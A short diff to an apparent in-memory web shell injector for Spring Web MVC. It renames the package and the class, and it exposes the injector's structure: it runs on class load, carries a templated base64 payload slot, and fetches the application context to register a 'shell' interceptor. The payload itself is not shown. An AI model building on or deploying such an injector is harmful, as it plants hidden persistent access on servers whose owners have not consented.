@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.springmvc.injector;
+package com.reajason.javaweb.memshell.springwebmvc.injector;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -14,10 +14,10 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  * @since 2024/12/22
  */
-public class SpringInterceptorInjector {
+public class SpringWebMvcInterceptorInjector {
 
     static {
-        new SpringInterceptorInjector();
+        new SpringWebMvcInterceptorInjector();
     }
 
     public String getUrlPattern() {
@@ -32,7 +32,7 @@ public class SpringInterceptorInjector {
         return "{{base64Str}}";
     }
 
-    public SpringInterceptorInjector() {
+    public SpringWebMvcInterceptorInjector() {
         try {
             Object context = getContext();
             Object interceptor = getShell();
